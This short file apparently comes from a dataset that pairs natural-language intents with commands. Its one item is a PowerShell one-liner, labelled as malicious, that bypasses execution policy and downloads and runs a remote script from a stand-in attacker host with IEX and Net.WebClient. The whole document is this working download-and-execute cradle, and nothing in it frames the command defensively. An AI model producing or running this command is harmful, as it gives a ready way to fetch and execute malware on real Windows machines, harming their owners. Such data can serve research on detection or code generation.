# Natural language intent:
# Download and execute a malicious PowerShell script with Bypass execution policy.

powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://evil-website.com/evilWin.ps1')"
